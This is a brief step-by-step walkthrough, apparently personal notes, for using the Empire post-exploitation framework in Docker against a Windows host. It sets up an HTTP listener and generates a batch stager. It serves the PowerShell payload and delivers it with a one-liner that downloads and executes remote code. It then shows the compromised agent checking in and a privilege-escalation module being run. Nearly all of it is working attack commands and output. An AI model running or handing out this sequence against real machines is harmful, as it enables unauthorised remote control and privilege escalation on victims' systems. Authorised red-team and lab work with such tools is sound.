#### 1. About

- URL: `https://github.com/BC-SECURITY/Empire#docker` (forked from `https://github.com/EmpireProject/Empire`)
- Empire3 PwerShell agent


#### 2. Setup and run
```
# docker pull bcsecurity/empire
# docker run --name empire -v /tmp:/tmp -p 5000:5000 --rm -it bcsecurity/empire ./empire
```


#### 3. Example

1. Listener
```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.135.4:5000
(Empire: listeners/http) > execute
(Empire: listeners/http) > back
```
Note: IP address of host interface where Docker container runs


2. Create payload
```
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
```


3. Prepare payload
```
# grep -oE 'powershell .*' /tmp/launcher.bat > data && python -m SimpleHTTPServer 8888
```

4. Deliver payload
```
C:\> echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.135.4:8888/data') | powershell -noprofile -
```

5. Interacting with the agent
```
(Empire: stager/windows/launcher_bat) >
[*] Sending POWERSHELL stager (stage 1) to 192.168.135.8
[*] New agent BUCRES1V checked in
[+] Initial agent BUCRES1V from 192.168.135.8 now active (Slack)
[*] Sending agent (stage 2) to BUCRES1V at 192.168.135.8
(Empire: stager/windows/launcher_bat) > interact BUCRES1V
(Empire: BUCRES1V) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > run
```

